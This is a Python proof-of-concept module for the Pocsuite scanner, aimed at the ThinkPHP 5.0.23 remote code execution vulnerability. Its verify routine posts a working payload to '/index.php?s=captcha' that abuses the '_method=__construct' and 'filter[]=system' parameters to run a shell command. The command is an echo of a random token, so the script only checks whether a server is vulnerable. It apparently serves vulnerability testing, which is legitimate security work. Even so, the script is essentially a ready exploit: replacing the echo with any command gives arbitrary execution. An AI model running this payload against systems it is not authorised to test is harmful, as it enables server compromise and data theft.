#!/usr/bin/python
# -*- coding: utf-8 -*-

import string
import time
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    name = 'ThinkPHP5 5.0.23 Remote Code Execution'
    vulID = '1'  # https://www.seebug.org/vuldb/ssvid-93077
    author = ['liujun']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce']
    desc = '''ThinkPHP5 5.0.23 Remote Code Execution'''

    vulDate = '2019-01-11'
    createDate = '2019-03-23'
    updateDate = '2019-03-23'

    appName = 'Thinkphp'
    appVersion = '5.0.23'
    appPowerLink = 'http://www.thinkphp.cn/'
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        self.url = self.url + '/index.php?s=captcha'
        token = randomStr()
        cmd = "echo {}".format(token)
        headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        }
        exploitdata = {'_method':'__construct','filter[]':'system','method':'get','server[REQUEST_METHOD]':cmd}
        matchstring = 'system error'

        resp = req.post(self.url,data=exploitdata,headers=headers)

        if matchstring in resp.content.lower() and token in resp.content :
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
